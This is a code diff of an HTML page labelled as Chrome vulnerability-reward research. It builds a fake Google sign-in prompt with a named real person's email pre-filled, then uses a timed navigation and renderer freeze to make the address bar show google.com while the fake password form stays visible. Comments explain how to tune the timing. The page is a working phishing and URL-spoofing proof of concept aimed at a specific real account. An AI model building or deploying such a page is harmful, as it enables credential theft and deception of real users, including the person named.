@@ -2,56 +2,54 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>VRP Research</title>
+    <title>Chrome VRP Research</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 40px 20px; background: #fff; }
+        body { font-family: sans-serif; text-align: center; padding: 40px 20px; }
         .box { border: 1px solid #dadce0; padding: 25px; border-radius: 8px; max-width: 350px; margin: 0 auto; }
         .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 16px; width: 100%; cursor: pointer; }
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        #status { color: red; font-weight: bold; margin-top: 15px; }
     </style>
 </head>
 <body>
+
     <div id="ui">
         <div class="box">
             <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
-            <h3>Identity Verification</h3>
-            <p>Your session has expired. Please re-enter your password.</p>
-            <input type="email" placeholder="Email" value="joshhawleyofficial@gmail.com">
-            <input type="password" placeholder="Password">
-            <button class="btn" id="go">Sign In</button>
+            <h3>Security Verification</h3>
+            <p>Confirm your password to stay signed in.</p>
+            <input type="email" value="joshhawleyofficial@gmail.com" readonly style="background:#f1f3f4;">
+            <input type="password" placeholder="Enter password" id="pass">
+            <button class="btn" onclick="startRace()">Sign In</button>
         </div>
     </div>
+    <div id="status"></div>
 
     <script>
-        document.getElementById('go').onclick = () => {
+        function startRace() {
             const target = "https://myaccount.google.com/?pli=1";
-            
+            document.getElementById('status').innerText = "RACING...";
+
             // 1. Trigger the navigation
             window.location.href = target;
 
-            // 2. THE NUCLEAR LOOP
-            // We are going to spam 'document.open' to keep the screen from clearing.
-            // We do this for 4 seconds straight.
-            const end = Date.now() + 4000;
-            const timer = setInterval(() => {
-                if (Date.now() > end) {
-                    clearInterval(timer);
-                    return;
+            // 2. THE DELAYED HIJACK
+            // We wait exactly 150ms to let the browser 'commit' the URL.
+            // If the URL still doesn't change, increase 150 to 300.
+            // If it goes to Google too fast, decrease 150 to 50.
+            setTimeout(() => {
+                const end = Date.now() + 5000;
+                while (Date.now() < end) {
+                    // This loop freezes the renderer (your screen)
+                    // But the Browser Process (URL bar) has already committed
+                    if (Math.random() > 0.99) { 
+                        // Minor updates to keep the UI from turning white
+                        document.title = "Spoofing... " + Date.now();
+                    }
                 }
-                
-                // We overwrite the 'new' page with our 'old' content
-                document.open();
-                document.write(`
-                    <div style="font-family:sans-serif; text-align:center; padding-top:100px;">
-                        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
-                        <h1>SPOOF ACTIVE</h1>
-                        <p>If your URL bar says google.com, SCREENSHOT NOW.</p>
-                        <input type="password" placeholder="Confirm Password">
-                    </div>
-                `);
-                document.close();
-            }, 5); // Run every 5 milliseconds
-        };
+                document.getElementById('status').innerText = "RACE FINISHED - DID IT WORK?";
+            }, 150); 
+        }
     </script>
 </body>
 </html>
